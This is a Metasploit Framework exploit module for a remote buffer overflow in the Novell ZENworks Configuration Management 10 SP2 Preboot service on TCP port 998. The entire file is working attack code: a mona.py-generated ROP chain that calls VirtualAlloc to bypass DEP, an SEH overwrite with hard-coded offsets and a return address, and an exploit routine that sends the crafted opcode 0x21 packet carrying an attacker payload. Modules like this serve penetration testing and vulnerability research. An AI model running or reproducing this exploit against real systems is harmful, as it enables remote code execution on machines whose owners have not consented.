##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell ZENworks Configuration Management Preboot Service 0x21 Buffer Overflow',
			'Description'    => %q{
					This module exploits a remote buffer overflow in the ZENworks Configuration
				Management 10 SP2. The vulnerability exists in the Preboot service and can be
				triggered by sending a specially crafted packet with the opcode 0x21
				(PROXY_CMD_FTP_FILE) to port 998/TCP. The module has been successfully tested on
				Novell ZENworks Configuration Management 10 SP2 and Windows Server 2003 SP2
				(DEP bypass).
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Stephen Fewer', # Vulnerability Discovery
					'juan' # Metasploit module
				],
			'References'     =>
				[
					[ 'OSVDB', '65361' ],
					[ 'BID', '40486' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-090/' ],
					[ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7005572' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process'
				},
			'Payload'        =>
				{
					'BadChars' => "",
					'Space'=> 8138,
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xC4\x54\xF2\xFF\xFF" # add esp, -3500
				},
			'Platform'       => ['win'],
			'Targets'        =>
				[
					[ 'Novell ZENworks Configuration Management 10 SP2 / Windows 2003 SP2',
						{
							'Offset'            => 8252,
							'OffsetBottomStack' => 8288,
							'OffsetRop'         => 44,
							'Ret'               => 0x0040175a # add esp, 0x408 # ret - novell_pbserv.exe
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Mar 30 2010',
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(998)], self.class)
	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("V").first
	end

	def nop
		return make_nops(4).unpack("L")[0].to_i
	end

	# rop chain generated with mona.py
	def create_rop_chain()
		rop_gadgets =
			[
				0x100065d1, # POP EDX # MOV ESI,C4830005 # ADD AL,3B # RETN [zenimgweb.dll]
				0x00001000, # 0x00001000-> edx
				0x10062113, # POP ECX # RETN [zenimgweb.dll]
				0x1007d158, # ptr to &VirtualAlloc() [IAT zenimgweb.dll]
				0x10018553, # MOV EAX,DWORD PTR DS:[ECX] # ADD ESP,20 # RETN [zenimgweb.dll]
				junk,       # Filler (compensate)
				junk,       # Filler (compensate)
				junk,       # Filler (compensate)
				junk,       # Filler (compensate)
				junk,       # Filler (compensate)
				junk,       # Filler (compensate)
				junk,       # Filler (compensate)
				junk,       # Filler (compensate)
				0x10016818, # PUSH EAX # POP ESI # RETN [zenimgweb.dll]
				0x1002fd05, # POP EBP # RETN [zenimgweb.dll]
				0x10043053, # & push esp #  ret  [zenimgweb.dll]
				0x1003cbf8, # POP EBX # RETN [zenimgweb.dll]
				0x00000001, # 0x00000001-> ebx
				0x00423eeb, # POP ECX # RETN [novell-pbserv.exe]
				0x00000040, # 0x00000040-> ecx
				0x1003173e, # POP EDI # RETN [zenimgweb.dll]
				0x10020801, # RETN (ROP NOP) [zenimgweb.dll]
				0x00406b58, # POP EAX # RETN [novell-pbserv.exe]
				nop,
				0x1006d1e6, # PUSHAD # RETN [zenimgweb.dll]
		].pack("V*")

		return rop_gadgets
	end


	def exploit
		connect

		buf = rand_text(target['OffsetRop'])
		buf << create_rop_chain
		buf << payload.encoded
		buf << rand_text(target['Offset'] - buf.length)
		buf << generate_seh_record(target.ret)
		buf << rand_text(target['OffsetBottomStack'] - buf.length)

		packet =  [0x21].pack("N") # Opcode 0x21 PROXY_CMD_FTP_FILE
		packet << [buf.length].pack("N") # Length
		packet << buf # Value
		sock.put(packet)

		disconnect
	end
end
